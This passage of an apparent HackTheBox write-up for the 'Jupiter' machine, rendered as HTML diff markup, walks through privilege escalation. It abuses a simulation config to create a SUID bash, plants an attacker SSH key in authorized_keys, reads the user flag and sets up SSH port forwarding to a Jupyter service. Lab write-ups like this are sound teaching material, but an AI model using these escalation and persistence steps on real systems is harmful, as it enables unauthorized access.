+<span class="n">drwx</span><span class="o">------</span> <span class="mi">3</span> <span class="n">root</span> <span class="n">root</span> <span class="mi">4096</span> <span class="n">Oct</span> <span class="mi">22</span> <span class="mi">12</span><span class="p">:</span><span class="mi">12</span> <span class="n">systemd</span><span class="o">-</span><span class="n">private</span><span class="o">-</span><span class="mi">11</span><span class="n">b86a004cc9404da525889a457fbf82</span><span class="o">-</span><span class="n">systemd</span><span class="o">-</span><span class="n">resolved</span><span class="o">.</span><span class="n">service</span><span class="o">-</span><span class="n">pHMGzj</span>
+<span class="n">drwx</span><span class="o">------</span> <span class="mi">3</span> <span class="n">root</span> <span class="n">root</span> <span class="mi">4096</span> <span class="n">Oct</span> <span class="mi">22</span> <span class="mi">12</span><span class="p">:</span><span class="mi">12</span> <span class="n">systemd</span><span class="o">-</span><span class="n">private</span><span class="o">-</span><span class="mi">11</span><span class="n">b86a004cc9404da525889a457fbf82</span><span class="o">-</span><span class="n">systemd</span><span class="o">-</span><span class="n">timesyncd</span><span class="o">.</span><span class="n">service</span><span class="o">-</span><span class="n">T5fLws</span>
+<span class="n">drwx</span><span class="o">------</span> <span class="mi">2</span> <span class="n">root</span> <span class="n">root</span> <span class="mi">4096</span> <span class="n">Oct</span> <span class="mi">22</span> <span class="mi">12</span><span class="p">:</span><span class="mi">13</span> <span class="n">vmware</span><span class="o">-</span><span class="n">root_798</span><span class="o">-</span><span class="mi">2999657446</span>
+<span class="nd">@postgres@jupiter</span><span class="p">:</span><span class="o">/</span><span class="n">dev</span><span class="o">/</span><span class="n">shm</span><span class="o">/</span><span class="n">privesc</span><span class="err">$</span>
+</pre></div>
+
+To escalate to 'Juno,' I'll copy <code>/bin/bash</code> to <code>/tmp/bash</code> and set it with SUID privileges. Then, I will execute <code>/tmp/bash -p</code> to inherit its privileges.<br/><br/>
+I will add the following content to 'network-simulation.yml':<br/><br/>
+<div class="highlight"><pre><span></span><span class="nd">@postgres@jupiter</span><span class="p">:</span><span class="o">/</span><span class="n">dev</span><span class="o">/</span><span class="n">shm</span><span class="o">/</span><span class="n">privesc</span><span class="err">$</span> <span class="n">cat</span> <span class="n">network</span><span class="o">-</span><span class="n">simulation</span><span class="o">.</span><span class="n">yml</span> 
+<span class="n">general</span><span class="p">:</span>
+  <span class="c1"># stop after 10 simulated seconds</span>
+  <span class="n">stop_time</span><span class="p">:</span> <span class="mi">10</span><span class="n">s</span>
+  <span class="c1"># old versions of cURL use a busy loop, so to avoid spinning in this busy</span>
+  <span class="c1"># loop indefinitely, we add a system call latency to advance the simulated</span>
+  <span class="c1"># time when running non-blocking system calls</span>
+  <span class="n">model_unblocked_syscall_latency</span><span class="p">:</span> <span class="n">true</span>
+
+<span class="n">network</span><span class="p">:</span>
+  <span class="n">graph</span><span class="p">:</span>
+    <span class="c1"># use a built-in network graph containing</span>
+    <span class="c1"># a single vertex with a bandwidth of 1 Gbit</span>
+    <span class="nb">type</span><span class="p">:</span> <span class="mi">1</span><span class="n">_gbit_switch</span>
+
+<span class="n">hosts</span><span class="p">:</span>
+  <span class="c1"># a host with the hostname 'server'</span>
+  <span class="n">server</span><span class="p">:</span>
+    <span class="n">network_node_id</span><span class="p">:</span> <span class="mi">0</span>
+    <span class="n">processes</span><span class="p">:</span>
+    <span class="o">-</span> <span class="n">path</span><span class="p">:</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">cp</span>
+      <span class="n">args</span><span class="p">:</span> <span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">bash</span> <span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">bash</span>
+      <span class="n">start_time</span><span class="p">:</span> <span class="mi">3</span><span class="n">s</span>
+  <span class="c1"># three hosts with hostnames 'client1', 'client2', and 'client3'</span>
+  <span class="n">client</span><span class="p">:</span>
+    <span class="n">network_node_id</span><span class="p">:</span> <span class="mi">0</span>
+    <span class="n">quantity</span><span class="p">:</span> <span class="mi">3</span>
+    <span class="n">processes</span><span class="p">:</span>
+    <span class="o">-</span> <span class="n">path</span><span class="p">:</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">chmod</span>
+      <span class="n">args</span><span class="p">:</span> <span class="mi">4755</span> <span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">bash</span>
+      <span class="n">start_time</span><span class="p">:</span> <span class="mi">5</span><span class="n">s</span>
+<span class="nd">@postgres@jupiter</span><span class="p">:</span><span class="o">/</span><span class="n">dev</span><span class="o">/</span><span class="n">shm</span><span class="o">/</span><span class="n">privesc</span><span class="err">$</span>
+</pre></div>
+
+As you can see, it will first copy <code>/bin/bash</code> to <code>/tmp/bash</code>, and then it will grant '4755' privilege (Set-UID) to <code>/tmp/bash</code>. With the 'Set-UID' flag set on <code>/tmp/bash</code>, I will be able to execute commands as 'Juno' by exploiting the '-p' parameter.<br/><br/>
+<div class="highlight"><pre><span></span><span class="nd">@postgres@jupiter</span><span class="p">:</span><span class="o">/</span><span class="n">dev</span><span class="o">/</span><span class="n">shm</span><span class="o">/</span><span class="n">privesc</span><span class="err">$</span> <span class="n">ls</span> <span class="o">-</span><span class="n">l</span> <span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">bash</span>
+<span class="o">-</span><span class="n">rwsr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span> <span class="mi">1</span> <span class="n">juno</span> <span class="n">juno</span> <span class="mi">1396520</span> <span class="n">Oct</span> <span class="mi">22</span> <span class="mi">13</span><span class="p">:</span><span class="mi">06</span> <span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">bash</span>
+<span class="nd">@postgres@jupiter</span><span class="p">:</span><span class="o">/</span><span class="n">dev</span><span class="o">/</span><span class="n">shm</span><span class="o">/</span><span class="n">privesc</span><span class="err">$</span>
+</pre></div>
+
+It has been successfully copied and set with Set-UID. Now, let's execute it with the '-p' parameter:<br/><br/>
+<div class="highlight"><pre><span></span><span class="nd">@postgres@jupiter</span><span class="p">:</span><span class="o">/</span><span class="n">dev</span><span class="o">/</span><span class="n">shm</span><span class="o">/</span><span class="n">privesc</span><span class="err">$</span> <span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">bash</span> <span class="o">-</span><span class="n">p</span>
+<span class="n">bash</span><span class="o">-</span><span class="mf">5.1</span><span class="err">$</span> <span class="n">whoami</span>
+<span class="n">juno</span>
+<span class="n">bash</span><span class="o">-</span><span class="mf">5.1</span><span class="err">$</span>
+</pre></div>
+
+We are now executing commands as 'Juno.'<br/><br/>
+However, if we attempt to read 'user.txt,' it indicates that we don't have access:<br/><br/>
+<div class="highlight"><pre><span></span><span class="n">bash</span><span class="o">-</span><span class="mf">5.1</span><span class="err">$</span> <span class="n">cat</span> <span class="n">user</span><span class="o">.</span><span class="n">txt</span>
+<span class="n">cat</span><span class="p">:</span> <span class="n">user</span><span class="o">.</span><span class="n">txt</span><span class="p">:</span> <span class="n">Permission</span> <span class="n">denied</span>
+<span class="n">bash</span><span class="o">-</span><span class="mf">5.1</span><span class="err">$</span>
+</pre></div>
+
+This is because we are executing commands with 'Juno's' EUID, and the 'user.txt' flag is only accessible to the owner and the 'Juno' group:<br/><br/>
+<div class="highlight"><pre><span></span><span class="n">bash</span><span class="o">-</span><span class="mf">5.1</span><span class="err">$</span> <span class="n">ls</span> <span class="o">-</span><span class="n">l</span> 
+<span class="n">total</span> <span class="mi">12</span>
+<span class="n">drwxrwxr</span><span class="o">-</span><span class="n">x</span> <span class="mi">12</span> <span class="n">juno</span> <span class="n">juno</span> <span class="mi">4096</span> <span class="n">Mar</span>  <span class="mi">9</span>  <span class="mi">2023</span> <span class="n">shadow</span>
+<span class="o">-</span><span class="n">rwxrwxr</span><span class="o">-</span><span class="n">x</span>  <span class="mi">1</span> <span class="n">juno</span> <span class="n">juno</span>  <span class="mi">174</span> <span class="n">Apr</span> <span class="mi">14</span>  <span class="mi">2023</span> <span class="n">shadow</span><span class="o">-</span><span class="n">simulation</span><span class="o">.</span><span class="n">sh</span>
+<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">-----</span>  <span class="mi">1</span> <span class="n">root</span> <span class="n">juno</span>   <span class="mi">33</span> <span class="n">Oct</span> <span class="mi">22</span> <span class="mi">12</span><span class="p">:</span><span class="mi">13</span> <span class="n">user</span><span class="o">.</span><span class="n">txt</span>
+<span class="n">bash</span><span class="o">-</span><span class="mf">5.1</span><span class="err">$</span>
+</pre></div>
+
+At this stage, we aren't truly 'Juno'; we're merely executing commands with 'Juno's' EUID, which is why we inherit some of its privileges.<br/><br/>
+<div class="highlight"><pre><span></span><span class="n">bash</span><span class="o">-</span><span class="mf">5.1</span><span class="err">$</span> <span class="nb">id</span>
+<span class="n">uid</span><span class="o">=</span><span class="mi">114</span><span class="p">(</span><span class="n">postgres</span><span class="p">)</span> <span class="n">gid</span><span class="o">=</span><span class="mi">120</span><span class="p">(</span><span class="n">postgres</span><span class="p">)</span> <span class="n">euid</span><span class="o">=</span><span class="mi">1000</span><span class="p">(</span><span class="n">juno</span><span class="p">)</span> <span class="n">groups</span><span class="o">=</span><span class="mi">120</span><span class="p">(</span><span class="n">postgres</span><span class="p">),</span><span class="mi">119</span><span class="p">(</span><span class="n">ssl</span><span class="o">-</span><span class="n">cert</span><span class="p">)</span>
+<span class="n">bash</span><span class="o">-</span><span class="mf">5.1</span><span class="err">$</span>
+</pre></div>
+
+Our next step is to attempt to gain access as 'Juno.' There are various techniques to achieve this, and in my case, I will work with SSH keys. I will copy the public key from my attacker's machine to the <code>/home/juno/authorized_keys</code> file. Once this is done, we can access the SSH service as the 'Juno' user without the need to provide a password<br/><br/>
+<div class="highlight"><pre><span></span><span class="n">bash</span><span class="o">-</span><span class="mf">5.1</span><span class="err">$</span> <span class="n">echo</span> <span class="o">-</span><span class="n">n</span> <span class="s1">'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDMzYWcHjgBMlcgqOv9UTofEDod6OdJZkH4UR6d/U5nzupmuCpg2a59S+JggOPXomVzNfNeGs2Q0iYKnAYj7AiwFubzyKxBvgImoI6v6C8J7tJVBOMhBW2Hzy53fXw4gn5jjxl4wJ6hAZtCIhkgQNImLhkQYictkBLGZkl7k73sU1rzLNsePfqk9nxbJ7jWYG5G9n+HfDCpUi8MHj7Mty55ETIsGwU9Nq16wd4wenHPRYSSQhRC7YMsvuSYYO/teoCc9JjUNu0GfpeLW5kU6ZP/62IF2869EiLKLU1wVqVIN2hxizwqVl8q8zF8U/lBR6WoP+mXzC9KxnA8LJcz0zCfXdscVO8pHkNT0iyDk+za4EIoDWVbDcClcYBqpLEg/eqgZOOPLopm/aXY4TBtdP348NM8qMl/9uBAqFya4SAcBsR98x5j7KWGqXkS8eTZ/nlK7k+gwWSoajS4UHYpNDtx+QUcR6MExMYXN0SgJOXf0UZFLR4RFXj69PKh9gcYch0= @elswix@kali'</span> <span class="o">&gt;</span> <span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">juno</span><span class="o">/.</span><span class="n">ssh</span><span class="o">/</span><span class="n">authorized_keys</span>
+<span class="n">bash</span><span class="o">-</span><span class="mf">5.1</span><span class="err">$</span>
+</pre></div>
+
+Now, if we attempt to connect to the victim machine as the 'Juno' user via SSH:<br/><br/>
+<div class="highlight"><pre><span></span><span class="nd">@elswix@kali</span><span class="err">$</span> <span class="n">ssh</span> <span class="n">juno</span><span class="o">@</span><span class="mf">10.10.11.216</span>
+<span class="n">Welcome</span> <span class="n">to</span> <span class="n">Ubuntu</span> <span class="mf">22.04.2</span> <span class="n">LTS</span> <span class="p">(</span><span class="n">GNU</span><span class="o">/</span><span class="n">Linux</span> <span class="mf">5.15.0</span><span class="o">-</span><span class="mi">72</span><span class="o">-</span><span class="n">generic</span> <span class="n">x86_64</span><span class="p">)</span>
+
+ <span class="o">*</span> <span class="n">Documentation</span><span class="p">:</span>  <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">help</span><span class="o">.</span><span class="n">ubuntu</span><span class="o">.</span><span class="n">com</span>
+ <span class="o">*</span> <span class="n">Management</span><span class="p">:</span>     <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">landscape</span><span class="o">.</span><span class="n">canonical</span><span class="o">.</span><span class="n">com</span>
+ <span class="o">*</span> <span class="n">Support</span><span class="p">:</span>        <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">ubuntu</span><span class="o">.</span><span class="n">com</span><span class="o">/</span><span class="n">advantage</span>
+
+  <span class="n">System</span> <span class="n">information</span> <span class="k">as</span> <span class="n">of</span> <span class="n">Sun</span> <span class="n">Oct</span> <span class="mi">22</span> <span class="mi">01</span><span class="p">:</span><span class="mi">15</span><span class="p">:</span><span class="mi">54</span> <span class="n">PM</span> <span class="n">UTC</span> <span class="mi">2023</span>
+
+  <span class="n">System</span> <span class="n">load</span><span class="p">:</span>           <span class="mf">0.0</span>
+  <span class="n">Usage</span> <span class="n">of</span> <span class="o">/</span><span class="p">:</span>            <span class="mf">81.3</span><span class="o">%</span> <span class="n">of</span> <span class="mf">12.33</span><span class="n">GB</span>
+  <span class="n">Memory</span> <span class="n">usage</span><span class="p">:</span>          <span class="mi">18</span><span class="o">%</span>
+  <span class="n">Swap</span> <span class="n">usage</span><span class="p">:</span>            <span class="mi">0</span><span class="o">%</span>
+  <span class="n">Processes</span><span class="p">:</span>             <span class="mi">235</span>
+  <span class="n">Users</span> <span class="n">logged</span> <span class="ow">in</span><span class="p">:</span>       <span class="mi">0</span>
+  <span class="n">IPv4</span> <span class="n">address</span> <span class="k">for</span> <span class="n">eth0</span><span class="p">:</span> <span class="mf">10.10.11.216</span>
+  <span class="n">IPv6</span> <span class="n">address</span> <span class="k">for</span> <span class="n">eth0</span><span class="p">:</span> <span class="n">dead</span><span class="p">:</span><span class="n">beef</span><span class="p">::</span><span class="mi">250</span><span class="p">:</span><span class="mi">56</span><span class="n">ff</span><span class="p">:</span><span class="n">feb9</span><span class="p">:</span><span class="n">af90</span>
+
+
+<span class="n">Expanded</span> <span class="n">Security</span> <span class="n">Maintenance</span> <span class="k">for</span> <span class="n">Applications</span> <span class="ow">is</span> <span class="ow">not</span> <span class="n">enabled</span><span class="o">.</span>
+
+<span class="mi">0</span> <span class="n">updates</span> <span class="n">can</span> <span class="n">be</span> <span class="n">applied</span> <span class="n">immediately</span><span class="o">.</span>
+
+<span class="n">Enable</span> <span class="n">ESM</span> <span class="n">Apps</span> <span class="n">to</span> <span class="n">receive</span> <span class="n">additional</span> <span class="n">future</span> <span class="n">security</span> <span class="n">updates</span><span class="o">.</span>
+<span class="n">See</span> <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">ubuntu</span><span class="o">.</span><span class="n">com</span><span class="o">/</span><span class="n">esm</span> <span class="ow">or</span> <span class="n">run</span><span class="p">:</span> <span class="n">sudo</span> <span class="n">pro</span> <span class="n">status</span>
+
+
+<span class="n">The</span> <span class="nb">list</span> <span class="n">of</span> <span class="n">available</span> <span class="n">updates</span> <span class="ow">is</span> <span class="n">more</span> <span class="n">than</span> <span class="n">a</span> <span class="n">week</span> <span class="n">old</span><span class="o">.</span>
+<span class="n">To</span> <span class="n">check</span> <span class="k">for</span> <span class="n">new</span> <span class="n">updates</span> <span class="n">run</span><span class="p">:</span> <span class="n">sudo</span> <span class="n">apt</span> <span class="n">update</span>
+
+<span class="n">Last</span> <span class="n">login</span><span class="p">:</span> <span class="n">Wed</span> <span class="n">Jun</span>  <span class="mi">7</span> <span class="mi">15</span><span class="p">:</span><span class="mi">13</span><span class="p">:</span><span class="mi">15</span> <span class="mi">2023</span> <span class="kn">from</span> <span class="mf">10.10.14.23</span>
+<span class="nd">@juno@jupiter</span><span class="p">:</span><span class="o">~</span><span class="err">$</span>
+</pre></div>
+
+We have successfully gained access to the system as 'Juno.' Running the 'id' command confirms that we now possess all of 'Juno's' privileges.<br/><br/>
+<div class="highlight"><pre><span></span><span class="nd">@juno@jupiter</span><span class="p">:</span><span class="o">~</span><span class="err">$</span> <span class="nb">id</span>
+<span class="n">uid</span><span class="o">=</span><span class="mi">1000</span><span class="p">(</span><span class="n">juno</span><span class="p">)</span> <span class="n">gid</span><span class="o">=</span><span class="mi">1000</span><span class="p">(</span><span class="n">juno</span><span class="p">)</span> <span class="n">groups</span><span class="o">=</span><span class="mi">1000</span><span class="p">(</span><span class="n">juno</span><span class="p">),</span><span class="mi">1001</span><span class="p">(</span><span class="n">science</span><span class="p">)</span>
+<span class="nd">@juno@jupiter</span><span class="p">:</span><span class="o">~</span><span class="err">$</span>
+</pre></div>
+
+At this point, we can read the first flag:<br/><br/>
+<div class="highlight"><pre><span></span><span class="nd">@juno@jupiter</span><span class="p">:</span><span class="o">~</span><span class="err">$</span> <span class="n">cat</span> <span class="n">user</span><span class="o">.</span><span class="n">txt</span>
+<span class="mi">74</span><span class="n">d4bab34e13d5117434b8de65f7ba5e</span>
+<span class="nd">@juno@jupiter</span><span class="p">:</span><span class="o">~</span><span class="err">$</span>
+</pre></div>
+<h3><br>Shell as jovian</br></h3><br>
+As 'Juno,' we are part of the 'science' group, which is an uncommon group. Let's list the files owned by the 'science' group:<br/><br/>
+<div class="highlight"><pre><span></span><span class="nd">@juno@jupiter</span><span class="p">:</span><span class="o">~</span><span class="err">$</span> <span class="n">find</span> <span class="o">/</span> <span class="o">-</span><span class="n">group</span> <span class="n">science</span> <span class="mi">2</span><span class="o">&gt;/</span><span class="n">dev</span><span class="o">/</span><span class="n">null</span>
+<span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">solar</span><span class="o">-</span><span class="n">flares</span>
+<span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">solar</span><span class="o">-</span><span class="n">flares</span><span class="o">/</span><span class="n">flares</span><span class="o">.</span><span class="n">csv</span>
+<span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">solar</span><span class="o">-</span><span class="n">flares</span><span class="o">/</span><span class="n">xflares</span><span class="o">.</span><span class="n">csv</span>
+<span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">solar</span><span class="o">-</span><span class="n">flares</span><span class="o">/</span><span class="nb">map</span><span class="o">.</span><span class="n">jpg</span>
+<span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">solar</span><span class="o">-</span><span class="n">flares</span><span class="o">/</span><span class="n">start</span><span class="o">.</span><span class="n">sh</span>
+<span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">solar</span><span class="o">-</span><span class="n">flares</span><span class="o">/</span><span class="n">logs</span>
+<span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">solar</span><span class="o">-</span><span class="n">flares</span><span class="o">/</span><span class="n">logs</span><span class="o">/</span><span class="n">jupyter</span><span class="o">-</span><span class="mi">2023</span><span class="o">-</span><span class="mi">03</span><span class="o">-</span><span class="mi">10</span><span class="o">-</span><span class="mf">25.</span><span class="n">log</span>
+<span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">solar</span><span class="o">-</span><span class="n">flares</span><span class="o">/</span><span class="n">logs</span><span class="o">/</span><span class="n">jupyter</span><span class="o">-</span><span class="mi">2023</span><span class="o">-</span><span class="mi">03</span><span class="o">-</span><span class="mi">08</span><span class="o">-</span><span class="mf">37.</span><span class="n">log</span>
+<span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">solar</span><span class="o">-</span><span class="n">flares</span><span class="o">/</span><span class="n">logs</span><span class="o">/</span><span class="n">jupyter</span><span class="o">-</span><span class="mi">2023</span><span class="o">-</span><span class="mi">03</span><span class="o">-</span><span class="mi">08</span><span class="o">-</span><span class="mf">38.</span><span class="n">log</span>
+<span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">solar</span><span class="o">-</span><span class="n">flares</span><span class="o">/</span><span class="n">logs</span><span class="o">/</span><span class="n">jupyter</span><span class="o">-</span><span class="mi">2023</span><span class="o">-</span><span class="mi">03</span><span class="o">-</span><span class="mi">08</span><span class="o">-</span><span class="mf">36.</span><span class="n">log</span>
+<span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">solar</span><span class="o">-</span><span class="n">flares</span><span class="o">/</span><span class="n">logs</span><span class="o">/</span><span class="n">jupyter</span><span class="o">-</span><span class="mi">2023</span><span class="o">-</span><span class="mi">03</span><span class="o">-</span><span class="mi">09</span><span class="o">-</span><span class="mf">11.</span><span class="n">log</span>
+<span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">solar</span><span class="o">-</span><span class="n">flares</span><span class="o">/</span><span class="n">logs</span><span class="o">/</span><span class="n">jupyter</span><span class="o">-</span><span class="mi">2023</span><span class="o">-</span><span class="mi">03</span><span class="o">-</span><span class="mi">09</span><span class="o">-</span><span class="mf">24.</span><span class="n">log</span>
+<span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">solar</span><span class="o">-</span><span class="n">flares</span><span class="o">/</span><span class="n">logs</span><span class="o">/</span><span class="n">jupyter</span><span class="o">-</span><span class="mi">2023</span><span class="o">-</span><span class="mi">03</span><span class="o">-</span><span class="mi">08</span><span class="o">-</span><span class="mf">14.</span><span class="n">log</span>
+<span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">solar</span><span class="o">-</span><span class="n">flares</span><span class="o">/</span><span class="n">logs</span><span class="o">/</span><span class="n">jupyter</span><span class="o">-</span><span class="mi">2023</span><span class="o">-</span><span class="mi">03</span><span class="o">-</span><span class="mi">09</span><span class="o">-</span><span class="mf">59.</span><span class="n">log</span>
+<span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">solar</span><span class="o">-</span><span class="n">flares</span><span class="o">/</span><span class="n">flares</span><span class="o">.</span><span class="n">html</span>
+<span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">solar</span><span class="o">-</span><span class="n">flares</span><span class="o">/</span><span class="n">cflares</span><span class="o">.</span><span class="n">csv</span>
+<span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">solar</span><span class="o">-</span><span class="n">flares</span><span class="o">/</span><span class="n">flares</span><span class="o">.</span><span class="n">ipynb</span>
+<span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">solar</span><span class="o">-</span><span class="n">flares</span><span class="o">/.</span><span class="n">ipynb_checkpoints</span>
+<span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">solar</span><span class="o">-</span><span class="n">flares</span><span class="o">/</span><span class="n">mflares</span><span class="o">.</span><span class="n">csv</span>
+<span class="nd">@juno@jupiter</span><span class="p">:</span><span class="o">~</span><span class="err">$</span>
+</pre></div>
+
+Upon examining the 'solar-flares' directory, we notice that all these files are also owned by the 'Jovian' user:<br/><br/>
+<div class="highlight"><pre><span></span><span class="nd">@juno@jupiter</span><span class="p">:</span><span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">solar</span><span class="o">-</span><span class="n">flares</span><span class="err">$</span> <span class="n">ls</span> <span class="o">-</span><span class="n">la</span>
+<span class="n">total</span> <span class="mi">2608</span>
+<span class="n">drwxrwx</span><span class="o">---</span> <span class="mi">4</span> <span class="n">jovian</span> <span class="n">science</span>    <span class="mi">4096</span> <span class="n">May</span>  <span class="mi">4</span> <span class="mi">18</span><span class="p">:</span><span class="mi">59</span> <span class="o">.</span>
+<span class="n">drwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span> <span class="mi">3</span> <span class="n">root</span>   <span class="n">root</span>       <span class="mi">4096</span> <span class="n">May</span>  <span class="mi">4</span> <span class="mi">18</span><span class="p">:</span><span class="mi">59</span> <span class="o">..</span>
+<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">rw</span><span class="o">----</span> <span class="mi">1</span> <span class="n">jovian</span> <span class="n">science</span>  <span class="mi">646164</span> <span class="n">Mar</span>  <span class="mi">8</span>  <span class="mi">2023</span> <span class="n">cflares</span><span class="o">.</span><span class="n">csv</span>
+<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">rw</span><span class="o">----</span> <span class="mi">1</span> <span class="n">jovian</span> <span class="n">science</span>  <span class="mi">708058</span> <span class="n">Mar</span>  <span class="mi">8</span>  <span class="mi">2023</span> <span class="n">flares</span><span class="o">.</span><span class="n">csv</span>
+<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">rw</span><span class="o">----</span> <span class="mi">1</span> <span class="n">jovian</span> <span class="n">science</span>   <span class="mi">10230</span> <span class="n">Mar</span>  <span class="mi">8</span>  <span class="mi">2023</span> <span class="n">flares</span><span class="o">.</span><span class="n">html</span>
+<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">-----</span> <span class="mi">1</span> <span class="n">jovian</span> <span class="n">science</span>  <span class="mi">234001</span> <span class="n">Mar</span>  <span class="mi">8</span>  <span class="mi">2023</span> <span class="n">flares</span><span class="o">.</span><span class="n">ipynb</span>
+<span class="n">drwxrwxr</span><span class="o">-</span><span class="n">x</span> <span class="mi">2</span> <span class="n">jovian</span> <span class="n">science</span>    <span class="mi">4096</span> <span class="n">May</span>  <span class="mi">4</span> <span class="mi">18</span><span class="p">:</span><span class="mi">59</span> <span class="o">.</span><span class="n">ipynb_checkpoints</span>
+<span class="n">drwxrwxr</span><span class="o">-</span><span class="n">t</span> <span class="mi">2</span> <span class="n">jovian</span> <span class="n">science</span>    <span class="mi">4096</span> <span class="n">Oct</span> <span class="mi">22</span> <span class="mi">12</span><span class="p">:</span><span class="mi">12</span> <span class="n">logs</span>
+<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">rw</span><span class="o">----</span> <span class="mi">1</span> <span class="n">jovian</span> <span class="n">science</span> <span class="mi">1010424</span> <span class="n">Mar</span>  <span class="mi">8</span>  <span class="mi">2023</span> <span class="nb">map</span><span class="o">.</span><span class="n">jpg</span>
+<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">rw</span><span class="o">----</span> <span class="mi">1</span> <span class="n">jovian</span> <span class="n">science</span>   <span class="mi">26651</span> <span class="n">Mar</span>  <span class="mi">8</span>  <span class="mi">2023</span> <span class="n">mflares</span><span class="o">.</span><span class="n">csv</span>
+<span class="o">-</span><span class="n">rwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span> <span class="mi">1</span> <span class="n">jovian</span> <span class="n">science</span>     <span class="mi">147</span> <span class="n">Mar</span>  <span class="mi">8</span>  <span class="mi">2023</span> <span class="n">start</span><span class="o">.</span><span class="n">sh</span>
+<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">rw</span><span class="o">----</span> <span class="mi">1</span> <span class="n">jovian</span> <span class="n">science</span>    <span class="mi">1992</span> <span class="n">Mar</span>  <span class="mi">8</span>  <span class="mi">2023</span> <span class="n">xflares</span><span class="o">.</span><span class="n">csv</span>
+<span class="nd">@juno@jupiter</span><span class="p">:</span><span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">solar</span><span class="o">-</span><span class="n">flares</span><span class="err">$</span>
+</pre></div>
+
+After inspecting the processes running under the 'Jovian' user, I came across the following:<br/><br/>
+<div class="highlight"><pre><span></span><span class="nd">@juno@jupiter</span><span class="p">:</span><span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">solar</span><span class="o">-</span><span class="n">flares</span><span class="err">$</span> <span class="n">ps</span> <span class="o">-</span><span class="n">auxw</span> <span class="o">|</span> <span class="n">grep</span> <span class="n">jovian</span> <span class="o">|</span> <span class="n">grep</span> <span class="o">-</span><span class="n">v</span> <span class="n">juno</span>
+<span class="n">jovian</span>      <span class="mi">1175</span>  <span class="mf">0.0</span>  <span class="mf">1.6</span>  <span class="mi">81344</span> <span class="mi">66504</span> <span class="err">?</span>        <span class="n">S</span>    <span class="mi">12</span><span class="p">:</span><span class="mi">12</span>   <span class="mi">0</span><span class="p">:</span><span class="mi">00</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">python3</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">local</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">jupyter</span><span class="o">-</span><span class="n">notebook</span> <span class="o">--</span><span class="n">no</span><span class="o">-</span><span class="n">browser</span> <span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">solar</span><span class="o">-</span><span class="n">flares</span><span class="o">/</span><span class="n">flares</span><span class="o">.</span><span class="n">ipynb</span>
+<span class="nd">@juno@jupiter</span><span class="p">:</span><span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">solar</span><span class="o">-</span><span class="n">flares</span><span class="err">$</span>
+</pre></div>
+
+Jovian is running 'jupyter-notebook.' According to ChatGPT, Jupyter Notebook is an open-source web application that allows you to create and share interactive documents containing code, text, graphics, and results. It is widely used in fields such as data science, scientific research, education, and programming.<br/><br/>
+Checking the open ports, we observe that port '8888' is open. This appears to be a web service, so I'm going to set up port forwarding to access it through my browser. Port forwarding can be accomplished using SSH with the '-L' parameter:<br/><br/>
+<div class="highlight"><pre><span></span><span class="nd">@elswix@kali</span><span class="err">$</span> <span class="n">ssh</span> <span class="n">juno</span><span class="o">@</span><span class="mf">10.10.11.216</span> <span class="o">-</span><span class="n">L</span> <span class="mi">8888</span><span class="p">:</span><span class="mf">127.0.0.1</span><span class="p">:</span><span class="mi">8888</span>
